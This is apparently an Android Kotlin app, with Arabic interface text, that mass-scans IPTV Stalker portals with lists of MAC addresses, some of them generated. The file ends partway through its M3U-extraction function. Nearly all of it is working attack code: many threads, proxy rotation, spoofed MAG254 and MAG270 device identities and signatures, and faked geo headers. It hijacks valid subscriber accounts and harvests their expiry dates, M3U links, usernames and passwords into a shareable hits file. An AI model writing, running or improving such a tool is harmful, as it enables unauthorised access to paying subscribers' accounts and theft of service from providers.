package com.rabie.mascanner

import android.app.Activity
import android.app.DownloadManager
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.ToneGenerator
import android.graphics.Typeface
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import java.io.File
import java.net.HttpURLConnection
import java.net.InetSocketAddress
import java.net.Proxy
import java.net.URL
import java.net.URLEncoder
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.RejectedExecutionException
import java.util.concurrent.ThreadPoolExecutor
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong
import org.json.JSONException
import org.json.JSONObject

class ScanEx(msg: String) : Exception(msg)

class Rresp(val code: Int, val body: String, val retryAfter: Int)

class HitItem(val mac: String, val info: String, val dot: String, val m3uPlus: String, val m3u8: String, val epg: String, val counts: String, val genres: String, val vpn: String, val user: String, val pass: String, val realHost: String)

class M3uInfo(val user: String, val pass: String, val realHost: String, val m3uPlus: String, val m3u8: String, val epg: String, val vpn: String)

class ServerInfo(val live: Int, val vod: Int, val series: Int, val genres: String)

class MainActivity : Activity() {

    private val UA = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/537.36"

    // ── UI ──
    private lateinit var screenHome: ScrollView
    private lateinit var screenRunning: ScrollView
    private lateinit var screenResults: ScrollView
    private lateinit var etPortal: EditText
    private lateinit var tvEndpointHint: TextView
    private lateinit var btnPickMacs: Button
    private lateinit var btnPasteToggle: Button
    private lateinit var etPaste: EditText
    private lateinit var tvMacsInfo: TextView
    private lateinit var etThreads: EditText
    private lateinit var etProxy: EditText
    private lateinit var btnStart: Button
    private lateinit var tvLastRun: TextView
    private lateinit var tvRunPortal: TextView
    private lateinit var pbProgress: ProgressBar
    private lateinit var tvProgress: TextView
    private lateinit var tvCHits: TextView
    private lateinit var tvCBlocked: TextView
    private lateinit var tvCNet: TextView
    private lateinit var tvGhost: TextView
    private lateinit var svLog: ScrollView
    private lateinit var tvLog: TextView
    private lateinit var btnStop: Button
    private lateinit var tvSummary: TextView
    private lateinit var hitsList: LinearLayout
    private lateinit var btnShare: Button
    private lateinit var btnAgain: Button

    private val handler = Handler(Looper.getMainLooper())

    // ── v1.2 إضافات ──
    private lateinit var cbGeo: android.widget.CheckBox
    private lateinit var etMinDays: EditText
    private lateinit var btnGenMacs: Button
    private lateinit var etGenCount: EditText
    private val proxyList = ArrayList<String>()
    private val proxyIdx = AtomicInteger(0)
    private var minDays = 0
    private var geoOn = false
    private val cM3u = AtomicLong()
    private val cExpFiltered = AtomicLong()

    // ── الحالة ──
    private var macUri: Uri? = null
    private var pickedValid: List<String> = emptyList()
    private var pickedInvalid: Int = 0
    private var totalValid: Int = 0
    private var invalidCount: Int = 0
    private var threadsCount: Int = 50
    private var proxyObj: Proxy? = null
    private var base: String = ""
    private var endpoint: String = ""
    private var startTime: Long = 0
    private var hitsFileObj: File? = null
    private var pool: ThreadPoolExecutor? = null
    private val running = AtomicBoolean(false)
    private val stopFlag = AtomicBoolean(false)

    // ── العدّادات ──
    private val cProcessed = AtomicLong()
    private val cHits = AtomicLong()
    private val cBlocked = AtomicLong()
    private val cGhost = AtomicLong()
    private val cNet = AtomicLong()
    private val cAuth = AtomicLong()
    private val cStruct = AtomicLong()
    private val cIO = AtomicLong()
    private val printedReasons = AtomicInteger()

    // ── السجل والنتائج ──
    private val logLock = Any()
    private val logLines = ArrayList<String>()
    private val hitLock = Any()
    private val hits = ArrayList<String>()
    private val hitItems = ArrayList<HitItem>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        screenHome = findViewById(R.id.screenHome)
        screenRunning = findViewById(R.id.screenRunning)
        screenResults = findViewById(R.id.screenResults)
        etPortal = findViewById(R.id.etPortal)
        tvEndpointHint = findViewById(R.id.tvEndpointHint)
        btnPickMacs = findViewById(R.id.btnPickMacs)
        btnPasteToggle = findViewById(R.id.btnPasteToggle)
        etPaste = findViewById(R.id.etPaste)
        tvMacsInfo = findViewById(R.id.tvMacsInfo)
        etThreads = findViewById(R.id.etThreads)
        etProxy = findViewById(R.id.etProxy)
        btnStart = findViewById(R.id.btnStart)
        tvLastRun = findViewById(R.id.tvLastRun)
        tvRunPortal = findViewById(R.id.tvRunPortal)
        pbProgress = findViewById(R.id.pbProgress)
        tvProgress = findViewById(R.id.tvProgress)
        tvCHits = findViewById(R.id.tvCHits)
        tvCBlocked = findViewById(R.id.tvCBlocked)
        tvCNet = findViewById(R.id.tvCNet)
        tvGhost = findViewById(R.id.tvGhost)
        svLog = findViewById(R.id.svLog)
        tvLog = findViewById(R.id.tvLog)
        btnStop = findViewById(R.id.btnStop)
        tvSummary = findViewById(R.id.tvSummary)
        hitsList = findViewById(R.id.hitsList)
        btnShare = findViewById(R.id.btnShare)
        btnAgain = findViewById(R.id.btnAgain)

        showScreen(1)

        btnPickMacs.setOnClickListener { pickFile() }

        btnPasteToggle.setOnClickListener {
            if (etPaste.visibility == View.GONE) {
                etPaste.visibility = View.VISIBLE
                tvMacsInfo.text = "الصق الماكات ثم ابدأ الفحص"
            } else {
                etPaste.visibility = View.GONE
                refreshMacsInfo()
            }
        }

        btnStart.setOnClickListener {
            if (running.get()) return@setOnClickListener
            startScan()
        }

        btnStop.setOnClickListener {
            if (!running.get()) return@setOnClickListener
            stopFlag.set(true)
            val p = pool
            if (p != null) p.shutdownNow()
            toast("⏹️ جاري الإيقاف — النتائج المحفوظة تبقى")
        }

        cbGeo = findViewById(R.id.cbGeo)
        etMinDays = findViewById(R.id.etMinDays)
        btnGenMacs = findViewById(R.id.btnGenMacs)
        etGenCount = findViewById(R.id.etGenCount)
        btnGenMacs.setOnClickListener { genMacs() }

        btnShare.setOnClickListener { shareResults() }
        btnAgain.setOnClickListener { showScreen(1) }
    }

    // ═══════════ الشاشات ═══════════
    private fun showScreen(n: Int) {
        screenHome.visibility = if (n == 1) View.VISIBLE else View.GONE
        screenRunning.visibility = if (n == 2) View.VISIBLE else View.GONE
        screenResults.visibility = if (n == 3) View.VISIBLE else View.GONE
    }

    private fun toast(s: String) {
        Toast.makeText(this, s, Toast.LENGTH_SHORT).show()
    }

    // ═══════════ اختيار ملف الماكات ═══════════
    private fun pickFile() {
        try {
            val i = Intent(Intent.ACTION_OPEN_DOCUMENT)
            i.addCategory(Intent.CATEGORY_OPENABLE)
            i.type = "*/*"
            startActivityForResult(i, 41)
        } catch (e: Exception) {
            toast("لا يوجد مدير ملفات — استعمل اللصق اليدوي 📝")
        }
    }

    override fun onActivityResult(req: Int, res: Int, data: Intent?) {
        super.onActivityResult(req, res, data)
        if (req != 41 || res != RESULT_OK) return
        val uri = data?.data
        if (uri == null) {
            toast("لم يتم اختيار ملف")
            return
        }
        macUri = uri
        tvMacsInfo.text = "⏳ جاري قراءة الملف…"
        Thread {
            try {
                val input = contentResolver.openInputStream(uri)
                val text = if (input != null) input.readBytes().toString(Charsets.UTF_8) else ""
                val parsed = parseMacs(text)
                pickedValid = parsed.first
                pickedInvalid = parsed.second
                handler.post { refreshMacsInfo() }
            } catch (e: Exception) {
                handler.post {
                    tvMacsInfo.text = "⚠️ فشل قراءة الملف — جرب لصق الماكات يدوياً"
                }
            }
        }.start()
    }

    private fun refreshMacsInfo() {
        if (pickedValid.isNotEmpty()) {
            tvMacsInfo.text = "الملف: الصالحة " + pickedValid.size + " · الغالطة " + pickedInvalid
        } else {
            tvMacsInfo.text = "ما اخترت ملف بعد"
        }
    }

    // ═══════════ التحقق من MAC ═══════════
    private fun isValidMAC(mac: String): Boolean {
        val parts = mac.uppercase(Locale.US).trim().split(":")
        if (parts.size != 6) return false
        for (p in parts) {
            if (p.length != 2) return false
            val v = p.toIntOrNull(16) ?: return false
            if (v < 0 || v > 255) return false
        }
        return true
    }

    private fun parseMacs(text: String): Pair<MutableList<String>, Int> {
        val out = ArrayList<String>()
        var bad = 0
        for (ln in text.split("\n")) {
            val t = ln.trim().replace("\r", "")
            if (t.isEmpty()) continue
            if (isValidMAC(t)) out.add(t.uppercase(Locale.US)) else bad++
        }
        return Pair(out, bad)
    }

    private fun currentMacList(): Pair<List<String>, Int> {
        val paste = etPaste.text?.toString() ?: ""
        if (paste.trim().isNotEmpty()) return parseMacs(paste)
        return Pair(pickedValid, pickedInvalid)
    }

    // ═══════════ البوابة والبروكسي ═══════════
    private fun normalizePortal(raw: String): String {
        var s = raw.trim()
        if (s.isEmpty()) return ""
        if (!s.contains("://")) s = "http://" + s
        s = s.trimEnd('/')
        return s
    }

    private fun parseProxy(raw: String): Proxy? {
        var s = raw.trim()
        if (s.isEmpty()) return null
        if (s.startsWith("http://")) s = s.substring(7)
        if (s.startsWith("socks5://")) s = s.substring(9)
        s = s.trimEnd('/')
        val lastColon = s.lastIndexOf(":")
        if (lastColon <= 0) return null
        val port = s.substring(lastColon + 1).trim().toIntOrNull() ?: return null
        if (port <= 0 || port > 65535) return null
        val host = s.substring(0, lastColon).trim()
        if (host.isEmpty()) return null
        return Proxy(Proxy.Type.HTTP, InetSocketAddress(host, port))
    }

    private fun pickProxy(): Proxy? {
        val n = proxyList.size
        if (n == 0) return proxyObj
        val line = proxyList[Math.floorMod(proxyIdx.getAndIncrement(), n)]
        return parseProxy(line) ?: proxyObj
    }

    // ═══════════ البدء ═══════════
    private fun startScan() {
        val portal = normalizePortal(etPortal.text?.toString() ?: "")
        if (portal.isEmpty() || !(portal.startsWith("http://") || portal.startsWith("https://"))) {
            toast("🌐 اكتب البوابة أولاً (مثال: 204.52.191.12:80)")
            return
        }
        val parsed = currentMacList()
        if (parsed.first.isEmpty()) {
            toast("📄 لا توجد MACs صالحة — اختر ملف أو الصق ماكات")
            return
        }
        val t = etThreads.text?.toString()?.trim()?.toIntOrNull() ?: 50
        threadsCount = if (t < 1) 50 else if (t > 100) 100 else t
        proxyObj = null
        proxyList.clear()
        for (ln in (etProxy.text?.toString() ?: "").split("\n")) {
            val t = ln.trim()
            if (t.isNotEmpty()) {
                val pp = parseProxy(t)
                if (pp != null) {
                    proxyList.add(t)
                    proxyObj = pp
                }
            }
        }
        minDays = etMinDays.text?.toString()?.trim()?.toIntOrNull() ?: 0
        if (minDays < 0) minDays = 0
        geoOn = cbGeo.isChecked
        totalValid = parsed.first.size
        invalidCount = parsed.second

        cProcessed.set(0); cHits.set(0); cBlocked.set(0); cGhost.set(0)
        cNet.set(0); cAuth.set(0); cStruct.set(0); cIO.set(0)
        printedReasons.set(0)
        cM3u.set(0)
        cExpFiltered.set(0)
        synchronized(logLock) { logLines.clear() }
        synchronized(hitLock) { hits.clear(); hitItems.clear() }
        handler.post { tvLog.text = "" }

        tvRunPortal.text = "⏳ جاري الفحص — " + portal
        pbProgress.progress = 0
        tvProgress.text = "0 / " + totalValid + " — 0%"
        tvCHits.text = "0"; tvCBlocked.text = "0"; tvCNet.text = "0"
        tvGhost.text = "👻 شبح/بلا بيانات: 0 · 🔑 فشل توثيق: 0"
        showScreen(2)

        running.set(true)
        stopFlag.set(false)
        startTime = System.currentTimeMillis()
        handler.post(uiTick)
        Thread { runEngine(portal, parsed.first) }.start()
    }

    private val uiTick = object : Runnable {
        override fun run() {
            if (!running.get()) return
            val processed = cProcessed.get()
            val pct = if (totalValid > 0) (processed * 100 / totalValid).toInt() else 0
            pbProgress.progress = pct
            tvProgress.text = processed.toString() + " / " + totalValid + " — " + pct + "%"
            tvCHits.text = cHits.get().toString()
            tvCBlocked.text = cBlocked.get().toString()
            tvCNet.text = cNet.get().toString()
            tvGhost.text = "👻 شبح/بلا بيانات: " + cGhost.get() + " · 🔑 فشل توثيق: " + cAuth.get()
            handler.postDelayed(this, 400)
        }
    }

    // ═══════════ المحرك ═══════════
    private fun runEngine(portal: String, macs: List<String>) {
        try {
            addLog("[*] Scanning portal endpoints...")
            val found = discover(portal)
            base = found.first
            endpoint = found.second
            handler.post {
                tvEndpointHint.text = "✓ المسار المكتشف تلقائياً: " + base + endpoint
                tvEndpointHint.visibility = View.VISIBLE
            }
            try {
                val dir = File(getExternalFilesDir(null), "Hits")
                if (!dir.exists()) dir.mkdirs()
                val f = File(dir, "go_hits.txt")
                if (!f.exists()) f.createNewFile()
                hitsFileObj = f
            } catch (e: Exception) {
                hitsFileObj = null
            }
            val poolLocal = ThreadPoolExecutor(
                threadsCount, threadsCount, 0L, TimeUnit.MILLISECONDS,
                LinkedBlockingQueue<Runnable>(300),
                ThreadPoolExecutor.CallerRunsPolicy()
            )
            pool = poolLocal
            for (mac in macs) {
                if (stopFlag.get()) break
                try {
                    poolLocal.execute { scanOne(mac, base, endpoint) }
                } catch (re: RejectedExecutionException) {
                    break
                }
            }
            poolLocal.shutdown()
            poolLocal.awaitTermination(3, TimeUnit.HOURS)
        } catch (e: Exception) {
            addLog("[-] " + (e.message ?: e.toString()))
        } finally {
            handler.post { finishRun() }
        }
    }

    private fun discover(portal: String): Pair<String, String> {
        val bases = ArrayList<String>()
        bases.add(portal)
        if (!portal.endsWith("/c") && !portal.endsWith("/c/")) bases.add(portal + "/c")
        val eps = arrayOf(
            "/server/load.php",
            "/portal.php",
            "/stalker_portal/server/load.php",
            "/c/server/load.php",
            "/c/portal.php",
            "/portalstb/"
        )
        for (b in bases) {
            for (ep in eps) {
                if (stopFlag.get()) break
                val u = b + ep + "?type=stb&action=handshake&JsHttpRequest=1-xml"
                val r: Rresp? = try {
                    httpGet(u, hdr1(portal, "00:1A:79:00:00:00"), 5000)
                } catch (e: Exception) {
                    null
                }
                if (r != null && (r.code == 200 || r.code == 401 || r.code == 512)) {
                    addLog("[✓] Found working endpoint: " + b + ep)
                    return Pair(b, ep)
                }
            }
        }
        addLog("[!] Defaulting to base + /server/load.php")
        return Pair(portal, "/server/load.php")
    }

    // ── فحص MAC واحد — نفس منطق v2.2 بالضبط ──
    private fun scanOne(mac: String, portal: String, ep: String) {
        cProcessed.incrementAndGet()
        try {
            val token = handshake(portal, ep, mac)
            val root: JSONObject = try {
                profile(portal, ep, mac, token)
            } catch (se: ScanEx) {
                cNet.incrementAndGet()
                addReason(mac, "profile", se.message)
                return
            } catch (je: JSONException) {
                cStruct.incrementAndGet()
                addReason(mac, "profile", "bad json")
                return
            } catch (io: Exception) {
                cNet.incrementAndGet()
                addReason(mac, "profile", io.message)
                return
            }

            var data: JSONObject? = root.optJSONObject("js")
            if (data == null) data = root.optJSONObject("data")
            if (data == null) {
                cStruct.incrementAndGet()
                addReason(mac, "profile", "no js object")
                return
            }

            val msg = data.optString("msg", "").trim()
            if (msg.isNotEmpty()) {
                cBlocked.incrementAndGet()
                return
            }

            val expMs = parseExp(data.opt("exp_date"))
            val statusRaw = data.opt("status")
            val status = if (statusRaw is String) statusRaw.trim() else ""
            val idNum = data.opt("id")
            val idOk = idNum is Number && idNum.toDouble() > 0
            var expStr = "Unknown"
            var remStr = "N/A"
            if (expMs != null) {
                val df = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                expStr = df.format(Date(expMs))
                remStr = calcRemaining(expMs)
            } else {
                // ── v1.1: القالب الفارغ ليس حكماً نهائياً — اسأل account_info ──
                val ai = accountInfo(portal, ep, mac, token)
                var aiExp = ai.second
                if (aiExp.isEmpty()) aiExp = ai.first
                if (aiExp.isNotEmpty() && aiExp != "0000-00-00 00:00:00") {
                    val t = parseFlexDate(aiExp)
                    if (t != null) {
                        expStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(t))
                        remStr = calcRemaining(t)
                    } else {
                        expStr = aiExp
                        remStr = "N/A"
                    }
                } else {
                    // ── v1.2: محاولة أخيرة بتنكر MAG270 (سلاسل Device ID) ──
                    val js2 = profileMAG270(portal, ep, mac, token)
                    var real2 = false
                    if (js2 != null) {
                        val expMs2 = parseExp(js2.opt("exp_date"))
                        val st2 = js2.optString("status", "").trim()
                        val id2 = js2.opt("id")
                        real2 = expMs2 != null || st2.isNotEmpty() || (id2 is Number && id2.toDouble() > 0)
                        if (real2) {
                            if (expMs2 != null) {
                                expStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(expMs2))
                                remStr = calcRemaining(expMs2)
                            } else {
                                expStr = "مفحوص (MAG270)"
                                remStr = "N/A"
                            }
                        }
                    }
                    if (!real2) {
                        cGhost.incrementAndGet()
                        return
                    }
                }
            }

            // ── v1.2: فلتر مدة الانتهاء ──
            if (minDays > 0) {
                val dd = when (remStr) {
                    "Expired" -> -1
                    "< 1 Day" -> 0
                    "N/A" -> Int.MAX_VALUE
                    else -> remStr.replace(" Days", "").trim().toIntOrNull() ?: Int.MAX_VALUE
                }
                if (dd < minDays) {
                    cExpFiltered.incrementAndGet()
                    return
                }
            }

            val chPair = channels(portal, ep, mac, token)
            val ch = chPair.first
            val firstCid = chPair.second
            val extra = playerApi(portal, mac, token)

            var item = HitItem(mac, "ينتهي " + expStr + " · متبقٍ " + remStr + " · " + ch + " قناة", dotFor(remStr), "", "", "", "", "", "", "", "", "")
            var m3uLine = ""
            val m3u = extractM3u(portal, ep, mac, token, firstCid)
            if (m3u != null) {
                cM3u.incrementAndGet()
                val si = serverInfo(m3u.realHost, m3u.user, m3u.pass)
                val counts = if (si != null) si.live.toString() + " قناة · " + si.vod + " فيلم · " + si.series + " مسلسل" else ""
                val genres = si?.genres ?: ""
                m3uLine = " | M3U: " + m3u.m3uPlus + " | User: " + m3u.user + ":" + m3u.pass + (if (m3u.vpn.isNotEmpty()) " | " + m3u.vpn else "")
                item = HitItem(mac, "ينتهي " + expStr + " · متبقٍ " + remStr + " · يوزر " + m3u.user, dotFor(remStr), m3u.m3uPlus, m3u.m3u8, m3u.epg, counts, genres, m3u.vpn, m3u.user, m3u.pass, m3u.realHost)
            } else {
                // ── v1.3: بوابة ماك-فقط → التصنيفات الحقيقية من البوابة نفسها ──
                val g = portalGenres(portal, ep, mac, token)
                if (g.isNotEmpty()) {
                    item = HitItem(mac, "ينتهي " + expStr + " · متبقٍ " + remStr + " · 🔐 ماك-فقط", dotFor(remStr), "", "", "", "", "🎬 تصنيفات: " + g, "", "", "", "")
                }
            }

            val line = "[HIT] Portal: " + portal + ep + " | MAC: " + mac +
                " | Expire: " + expStr + " | Remaining: " + remStr +
                " | Channels: " + ch + extra + m3uLine

            synchronized(hitLock) {
                try {
                    val f = hitsFileObj
                    if (f != null) f.appendText(line + "\n")
                } catch (e: Exception) {
                    cIO.incrementAndGet()
                }
                hits.add(line)
                hitItems.add(item)
            }
            try {
                val tg = ToneGenerator(AudioManager.STREAM_MUSIC, 85)
                tg.startTone(ToneGenerator.TONE_PROP_ACK, 180)
            } catch (e: Exception) {
            }
            cHits.incrementAndGet()
            addLog(line)
        } catch (se: ScanEx) {
            if (se.message == "token not found") {
                cAuth.incrementAndGet()
            } else {
                cNet.incrementAndGet()
                addReason(mac, "handshake", se.message)
            }
        } catch (je: JSONException) {
            cStruct.incrementAndGet()
            addReason(mac, "handshake", "bad json")
        } catch (io: Exception) {
            cNet.incrementAndGet()
            addReason(mac, "handshake", io.message)
        }
    }

    private fun dotFor(remStr: String): String {
        if (remStr == "Expired") return "🔴"
        if (remStr == "N/A" || remStr == "< 1 Day") return "🟡"
        val days = remStr.replace(" Days", "").trim().toIntOrNull()
        if (days != null && days <= 30) return "🟡"
        return "🟢"
    }

    // ═══════════ HTTP + إعادة المحاولة 429 ═══════════
    private fun httpGet(urlStr: String, headers: Map<String, String>, timeoutMs: Int): Rresp {
        val u = URL(urlStr)
        val px = pickProxy()
        val conn: HttpURLConnection = (if (px != null) u.openConnection(px) else u.openConnection()) as HttpURLConnection
        try {
            conn.connectTimeout = timeoutMs
            conn.readTimeout = timeoutMs
            conn.instanceFollowRedirects = true
            for ((k, v) in headers) conn.setRequestProperty(k, v)
            val code = conn.responseCode
            val st = if (code in 200..399) conn.inputStream else conn.errorStream
            val body = if (st != null) st.bufferedReader(Charsets.UTF_8).use { it.readText() } else ""
            var ra = 0
            val rav = conn.getHeaderField("Retry-After")
            if (rav != null) ra = rav.trim().toIntOrNull() ?: 0
            return Rresp(code, body, ra)
        } finally {
            conn.disconnect()
        }
    }

    private fun httpRetry(urlStr: String, headers: Map<String, String>, timeoutMs: Int): Rresp {
        var last = Rresp(0, "", 0)
        for (attempt in 1..3) {
            if (stopFlag.get()) return last
            last = httpGet(urlStr, headers, timeoutMs)
            if (last.code != 429 && last.code != 503) return last
            var waitMs = attempt * 1200L
            if (last.retryAfter in 1..10) waitMs = last.retryAfter * 1000L
            if (attempt < 3) {
                try {
                    Thread.sleep(waitMs)
                } catch (ie: InterruptedException) {
                    return last
                }
            }
        }
        return last
    }

    private fun hdr1(portal: String, mac: String): Map<String, String> {
        val m = HashMap<String, String>()
        m["User-Agent"] = UA
        m["Referer"] = portal + "/c/"
        m["Accept"] = "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        m["Cookie"] = "mac=" + URLEncoder.encode(mac.uppercase(Locale.US), "UTF-8") + "; stb_lang=en; timezone=Europe%2FParis;"
        m["Connection"] = "Keep-Alive"
        m["X-User-Agent"] = "Model: MAG254; Link: Ethernet"
        if (geoOn) {
            m["X-Forwarded-For"] = "8.8.8.8"
            m["CF-IPCountry"] = "US"
            m["Accept-Language"] = "en-US,en;q=0.9"
        }
        return m
    }

    private fun hdr2(portal: String, mac: String, token: String): Map<String, String> {
        val m = HashMap<String, String>(hdr1(portal, mac))
        m["Authorization"] = "Bearer " + token
        return m
    }

    private fun handshake(portal: String, ep: String, mac: String): String {
        val u = portal + ep + "?type=stb&action=handshake&mac=" +
            URLEncoder.encode(mac.uppercase(Locale.US), "UTF-8") +
            "&token=&prehash=false&JsHttpRequest=1-xml"
        val r = httpRetry(u, hdr1(portal, mac), 8000)
        if (r.code != 200) throw ScanEx("status code: " + r.code)
        val root = JSONObject(r.body)
        var token = ""
        val jsObj = root.optJSONObject("js")
        if (jsObj != null) token = jsObj.optString("token", "").trim()
        if (token.isEmpty()) token = root.optString("token", "").trim()
        if (token.isEmpty()) throw ScanEx("token not found")
        return token
    }

    private fun profile(portal: String, ep: String, mac: String, token: String): JSONObject {
        val u = portal + ep + "?type=stb&action=get_profile&mac=" +
            URLEncoder.encode(mac.uppercase(Locale.US), "UTF-8") +
            "&token=" + URLEncoder.encode(token, "UTF-8") + "&JsHttpRequest=1-xml"
        val r = httpRetry(u, hdr2(portal, mac, token), 8000)
        if (r.code != 200) throw ScanEx("status code: " + r.code)
        return JSONObject(r.body)
    }

    // ── v1.1: account_info — مصدر الحقيقة على بوابات تخفي الملف خلف قالب فارغ ──
    private fun accountInfo(portal: String, ep: String, mac: String, token: String): Pair<String, String> {
        return try {
            val u = portal + ep + "?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
            val r = httpRetry(u, hdr2(portal, mac, token), 8000)
            if (r.code != 200) Pair("", "")
            else {
                val root = JSONObject(r.body)
                val js = root.optJSONObject("js")
                val phone = js?.optString("phone", "")?.trim() ?: ""
                val endDate = js?.optString("end_date", "")?.trim() ?: ""
                Pair(phone, endDate)
            }
        } catch (e: Exception) {
            Pair("", "")
        }
    }

    // ── v1.1: تواريخ بأشكال متعددة (بما فيها November 25, 2026, 1:41 am) ──
    private fun parseFlexDate(s0: String): Long? {
        val s = s0.trim()
        if (s.isEmpty()) return null
        val fmts = arrayOf(
            "MMMM d, yyyy, h:mm a",
            "MMMM d, yyyy, HH:mm",
            "MMMM d, yyyy",
            "yyyy-MM-dd HH:mm:ss",
            "yyyy-MM-dd"
        )
        for (f in fmts) {
            try {
                val p = SimpleDateFormat(f, Locale.ENGLISH)
                p.isLenient = false
                val t = p.parse(s)
                if (t != null) return t.time
            } catch (e: Exception) {
            }
        }
        return null
    }

    private fun channels(portal: String, ep: String, mac: String, token: String): Pair<Int, String> {
        // ── v1.3: نمط سكريبتك أولاً (type=itv + total_items) — يعمل على بوابات ماك-فقط ──
        try {
            val u1 = portal + ep + "?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
            val r1 = httpRetry(u1, hdr2(portal, mac, token), 12000)
            if (r1.code == 200 && r1.body.contains("total_items")) {
                val total = r1.body.split("\"total_items\":")[1].split(",")[0].trim().toIntOrNull() ?: 0
                var firstId = ""
                if (r1.body.contains("\"data\":[{\"id\":\"")) {
                    firstId = r1.body.split("\"data\":[{\"id\":\"")[1].split("\"")[0]
                }
                if (total > 0) return Pair(total, firstId)
            }
        } catch (e: Exception) {
        }
        return try {
            val u = portal + ep + "?type=stb&action=get_all_channels&JsHttpRequest=1-xml"
            val r = httpRetry(u, hdr2(portal, mac, token), 8000)
            if (r.code != 200) Pair(0, "")
            else {
                val root = JSONObject(r.body)
                val arr = root.optJSONArray("js")
                if (arr == null) Pair(0, "")
                else {
                    var firstId = ""
                    val o0 = arr.optJSONObject(0)
                    if (o0 != null) {
                        firstId = o0.optString("id", "")
                        if (firstId.isEmpty()) firstId = o0.optString("ch_id", "")
                        if (firstId.isEmpty()) firstId = o0.optString("num", "")
                    }
                    Pair(arr.length(), firstId)
                }
            }
        } catch (e: Exception) {
            Pair(0, "")
        }
    }

    private fun playerApi(portal: String, mac: String, token: String): String {
        return try {
            val u = portal + "/player_api.php?username=user&password=pass"
            val r = httpRetry(u, hdr2(portal, mac, token), 8000)
            if (r.code == 200) " | Player API Available" else ""
        } catch (e: Exception) {
            ""
        }
    }

    // ── v1.2: سلاسل Device ID (تنكر MAG270 كامل) ──
    private fun md5(s: String): String {
        val b = java.security.MessageDigest.getInstance("MD5").digest(s.toByteArray(Charsets.UTF_8))
        return b.joinToString("") { "%02x".format(it) }
    }

    private fun sha256(s: String): String {
        val b = java.security.MessageDigest.getInstance("SHA-256").digest(s.toByteArray(Charsets.UTF_8))
        return b.joinToString("") { "%02x".format(it) }
    }

    private fun profileMAG270(portal: String, ep: String, mac: String, token: String): JSONObject? {
        return try {
            val sn = md5(mac).uppercase(Locale.US)
            val snCut = sn.substring(0, 13)
            val dev = sha256(mac).uppercase(Locale.US)
            val ts = (System.currentTimeMillis() / 1000).toString()
            val ver = "ImageDescription:%200.2.18-r22-pub-270;%20ImageDate:%20Tue%20Dec%2019%2011:33:53%20EET%202017;%20PORTAL%20version:%205.6.6;%20API%20Version:%20JS%20API%20version:%20328;%20STB%20API%20version:%20134;%20Player%20Engine%20version:%200x566"
            val metrics = "{\"mac\":\"" + mac + "\",\"sn\":\"" + snCut + "\",\"model\":\"MAG270\",\"type\":\"STB\",\"uid\":\"" + dev + "\",\"random\":\"null\"}"
            val u = portal + ep + "?type=stb&action=get_profile&hd=1&ver=" + ver +
                "&num_banks=2&sn=" + snCut + "&stb_type=MAG270&client_type=STB&image_version=0.2.18&video_out=hdmi&device_id=" + dev +
                "&device_id2=" + dev + "&signature=" + URLEncoder.encode("OaRqL9kBdR5qnMXL+h6b+i8yeRs9/xWXeKPXpI48VVE=", "UTF-8") +
                "&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=" + URLEncoder.encode(metrics, "UTF-8") +
                "&timestamp=" + ts + "&api_signature=262&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a&JsHttpRequest=1-xml"
            val r = httpRetry(u, hdr2(portal, mac, token), 8000)
            if (r.code != 200) null else JSONObject(r.body).optJSONObject("js")
        } catch (e: Exception) {
            null
        }
    }

    private fun d2s(body: String, key: String): String {
        return try {
            body.split("\"" + key + "\":\"")[1].split("\"")[0].replace("\\/", "/")
        } catch (e: Exception) {
            ""
        }
    }

    private fun titles(body: String, limit: Int): String {
        val out = ArrayList<String>()
        for (key in arrayOf("category_name\":\"", "title\":\"")) {
            val parts = body.split(key)
            for (i in 1 until parts.size) {
                if (out.size >= limit) break
                val t = parts[i].split("\"")[0].replace("\\/", "/").trim()
                if (t.isNotEmpty() && !t.contains("{") && !t.contains("}")) out.add(t)
            }
            if (out.size >= limit) break
        }
        return out.take(limit).joinToString(" · ")
    }

    // ── v1.3: تصنيفات بوابة ماك-فقط (itv get_genres بحقل title) ──
    private fun portalGenres(portal: String, ep: String, mac: String, token: String): String {
        return try {
            val u = portal + ep + "?type=itv&action=get_genres&JsHttpRequest=1-xml"
            val r = httpRetry(u, hdr2(portal, mac, token), 10000)
            if (r.code != 200) "" else titles(r.body, 8)
        } catch (e: Exception) {
            ""
        }
    }

    // ── v1.2: استخراج M3U/Xtream عند الـHIT (منطق سكريبتك) ──
    private fun extractM3u(portal: String, ep: String, mac: String, token: String, firstCid: String): M3uInfo? {
        var link = ""
        try {
            val u1 = portal + ep + "?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml"
            val r1 = httpRetry(u1, hdr2(portal, mac, token), 8000)
            if (r1.code == 200 && r1.body.contains("\"cmd\":\"")) {
                val cmd = d2s(r1.body, "cmd")
                if (cmd.isNotEmpty()) {
                    val u2 = portal + ep + "?type=vod&action=create_link&cmd=" +
                        URLEncoder.encode(cmd, "UTF-8") +
                        "&series=&forced_storage=&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
                    val r2 = httpRetry(u2, hdr2(portal, mac, token), 8000)
                    if (r2.code == 200 && r2.body.contains("\"cmd\":\"")) {
                        link = r2.body.split("\"cmd\":\"")[1].split("\"")[0].replace("\\/", "/")
                    }
                }
            }
        } catch (e: Exception) {
        }
